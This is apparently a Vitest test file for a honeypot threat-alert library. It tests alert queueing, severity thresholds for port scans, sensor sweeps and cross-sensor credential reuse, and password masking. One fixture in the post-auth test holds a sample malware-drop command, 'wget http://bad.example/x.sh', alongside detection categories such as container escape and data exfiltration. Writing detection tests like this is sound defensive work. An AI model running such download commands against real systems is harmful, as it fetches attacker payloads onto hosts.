import { describe, expect, it, vi, afterEach } from 'vitest'
import {
  deriveAuthBurstLevel,
  deriveCredReuseCrossSensorLevel,
  deriveMultiServiceLevel,
  derivePortFanoutLevel,
  deriveSweepLevel,
  drainThreatQueue,
  hasExploitAuthSequence,
  hasSuspiciousPostAuthActivity,
  pendingThreatCount,
  scheduleThreatAlert,
  summarizeSensorActivity,
} from '../src/lib/threat-alerts.js'
import {
  checkCredReuseCrossSensor,
  checkPortScanFanout,
  checkSensorSweep,
} from '../src/lib/threat-checks.js'
import type { PrismaClient } from '@prisma/client'

describe('threat evaluation queue', () => {
  // A prisma stub without $queryRaw: evaluateThreatAlert returns early, so these
  // tests exercise only the enqueue/drain mechanics, not the heavy queries.
  const fakePrisma = {} as PrismaClient

  afterEach(async () => {
    // Flush any leftover queued IPs so tests don't bleed into each other.
    await drainThreatQueue(fakePrisma)
  })

  it('dedupes repeated IPs into a single queued entry', () => {
    scheduleThreatAlert(fakePrisma, '1.2.3.4')
    scheduleThreatAlert(fakePrisma, '1.2.3.4')
    scheduleThreatAlert(fakePrisma, '5.6.7.8')
    expect(pendingThreatCount()).toBe(2)
  })

  it('ignores empty IPs', () => {
    scheduleThreatAlert(fakePrisma, '')
    expect(pendingThreatCount()).toBe(0)
  })

  it('clears the queue after draining', async () => {
    scheduleThreatAlert(fakePrisma, '9.9.9.9')
    expect(pendingThreatCount()).toBe(1)
    await drainThreatQueue(fakePrisma)
    expect(pendingThreatCount()).toBe(0)
  })

  it('is a no-op when the queue is empty', async () => {
    await expect(drainThreatQueue(fakePrisma)).resolves.toBeUndefined()
  })
})

describe('threat alert heuristics', () => {
  it('grades multi-service activity by breadth', () => {
    expect(deriveMultiServiceLevel(1)).toBeNull()
    expect(deriveMultiServiceLevel(2)).toBe('HIGH')
    expect(deriveMultiServiceLevel(3)).toBe('CRITICAL')
  })

  it('grades auth bursts by volume', () => {
    expect(deriveAuthBurstLevel(5)).toBeNull()
    expect(deriveAuthBurstLevel(8)).toBe('HIGH')
    expect(deriveAuthBurstLevel(12)).toBe('CRITICAL')
  })

  it('detects scan -> exploit -> auth chains', () => {
    expect(
      hasExploitAuthSequence({
        hasPortScan: true,
        webAttackTypes: ['scanner', 'sqli'],
        totalAuthAttempts: 3,
      }),
    ).toBe(true)

    expect(
      hasExploitAuthSequence({
        hasPortScan: true,
        webAttackTypes: ['scanner'],
        totalAuthAttempts: 3,
      }),
    ).toBe(false)
  })

  it('flags suspicious post-auth command categories only', () => {
    expect(
      hasSuspiciousPostAuthActivity({
        ssh_backdoor: [],
        honeypot_evasion: [],
        container_escape: [],
        malware_drop: [],
        persistence: [],
        lateral_movement: [],
        crypto_mining: [],
        data_exfil: [],
        solana_targeting: [],
        recon: ['whoami'],
      }),
    ).toBe(false)

    expect(
      hasSuspiciousPostAuthActivity({
        ssh_backdoor: [],
        honeypot_evasion: [],
        container_escape: [],
        malware_drop: ['wget http://bad.example/x.sh'],
        persistence: [],
        lateral_movement: [],
        crypto_mining: [],
        data_exfil: [],
        solana_targeting: [],
        recon: [],
      }),
    ).toBe(true)
  })
})

describe('deriveSweepLevel', () => {
  it('returns null below both thresholds', () => {
    expect(deriveSweepLevel(1, 1)).toBeNull()
  })

  it('returns HIGH at the sensor or family threshold', () => {
    expect(deriveSweepLevel(2, 1)).toBe('HIGH')
    expect(deriveSweepLevel(1, 3)).toBe('HIGH')
  })

  it('returns CRITICAL at the higher sensor or family threshold', () => {
    expect(deriveSweepLevel(5, 1)).toBe('CRITICAL')
    expect(deriveSweepLevel(1, 4)).toBe('CRITICAL')
  })
})

describe('derivePortFanoutLevel', () => {
  it('returns null below 8 distinct ports', () => {
    expect(derivePortFanoutLevel(7)).toBeNull()
  })

  it('returns HIGH at 8 ports', () => {
    expect(derivePortFanoutLevel(8)).toBe('HIGH')
  })

  it('returns CRITICAL at 15 ports', () => {
    expect(derivePortFanoutLevel(15)).toBe('CRITICAL')
  })
})

describe('deriveCredReuseCrossSensorLevel', () => {
  it('returns null for a credential seen on a single sensor', () => {
    expect(deriveCredReuseCrossSensorLevel(1)).toBeNull()
  })

  it('returns HIGH at 2 sensors', () => {
    expect(deriveCredReuseCrossSensorLevel(2)).toBe('HIGH')
  })

  it('returns CRITICAL at 4 sensors', () => {
    expect(deriveCredReuseCrossSensorLevel(4)).toBe('CRITICAL')
  })
})

describe('summarizeSensorActivity', () => {
  it('derives sensor/family/port breadth and flags credentials reused across sensors', () => {
    const summary = summarizeSensorActivity([
      { sensor_id: 'cowrie-1', protocol: 'ssh', dst_port: 22, username: 'root', password: 'toor' },
      { sensor_id: 'dionaea-1', protocol: 'smb', dst_port: 445, username: 'root', password: 'toor' },
      { sensor_id: 'dionaea-1', protocol: 'smb', dst_port: 3389, username: null, password: null },
      { sensor_id: 'cowrie-1', protocol: 'ssh', dst_port: 22, username: 'admin', password: 'admin' },
    ])

    expect(summary.sensorsSeen).toBe(2)
    expect(summary.familiesSeen).toBe(2)
    expect(summary.distinctPorts).toBe(3)
    expect(summary.ports).toEqual([22, 445, 3389])
    expect(summary.reusedCredentials).toEqual([
      { username: 'root', password: 'toor', sensors: ['cowrie-1', 'dionaea-1'] },
    ])
  })

  it('does not count a credential seen on only one sensor as reused', () => {
    const summary = summarizeSensorActivity([
      { sensor_id: 'cowrie-1', protocol: 'ssh', dst_port: 22, username: 'root', password: 'toor' },
      { sensor_id: 'cowrie-1', protocol: 'ssh', dst_port: 22, username: 'root', password: 'toor' },
    ])

    expect(summary.reusedCredentials).toEqual([])
  })

  it('treats usernames and passwords containing spaces as distinct from a space-joined collision', () => {
    const summary = summarizeSensorActivity([
      { sensor_id: 'a', protocol: 'ssh', dst_port: null, username: 'foo bar', password: 'baz' },
      { sensor_id: 'b', protocol: 'ftp', dst_port: null, username: 'foo', password: 'bar baz' },
    ])

    expect(summary.reusedCredentials).toEqual([])
  })
})

describe('checkSensorSweep', () => {
  it('returns null when below threshold', () => {
    expect(checkSensorSweep('1.2.3.4', 1, 1, ['ssh'], 60000)).toBeNull()
  })

  it('builds a payload with the sensor_sweep key when triggered', () => {
    const alert = checkSensorSweep('1.2.3.4', 5, 4, ['ssh', 'smb', 'ftp', 'http'], 60000)
    expect(alert).not.toBeNull()
    expect(alert!.key).toBe('sensor_sweep:1.2.3.4')
    expect(alert!.level).toBe('critical')
  })
})

describe('checkPortScanFanout', () => {
  it('returns null when below threshold', () => {
    expect(checkPortScanFanout('1.2.3.4', 3, [21, 22, 23], 60000)).toBeNull()
  })

  it('builds a payload with the port_fanout key when triggered', () => {
    const ports = Array.from({ length: 8 }, (_, i) => 1000 + i)
    const alert = checkPortScanFanout('1.2.3.4', 8, ports, 60000)
    expect(alert).not.toBeNull()
    expect(alert!.key).toBe('port_fanout:1.2.3.4')
    expect(alert!.level).toBe('high')
  })
})

describe('checkCredReuseCrossSensor', () => {
  it('returns null with no reused credentials', () => {
    expect(checkCredReuseCrossSensor('1.2.3.4', [], 60000)).toBeNull()
  })

  it('returns null when the top credential is below the reuse threshold', () => {
    const alert = checkCredReuseCrossSensor(
      '1.2.3.4',
      [{ username: 'root', password: 'toor', sensors: ['cowrie-1'] }],
      60000,
    )
    expect(alert).toBeNull()
  })

  it('masks the password and builds a payload with the cred_reuse_cross_sensor key when triggered', () => {
    const alert = checkCredReuseCrossSensor(
      '1.2.3.4',
      [{ username: 'root', password: 'toor', sensors: ['cowrie-1', 'dionaea-1'] }],
      60000,
    )
    expect(alert).not.toBeNull()
    expect(alert!.key).toBe('cred_reuse_cross_sensor:1.2.3.4')
    expect(alert!.level).toBe('high')
    const credField = alert!.fields.find((f) => f.name === 'Credential')
    expect(credField?.value).toContain('(4 chars)')
    expect(credField?.value).not.toContain('toor')
  })
})
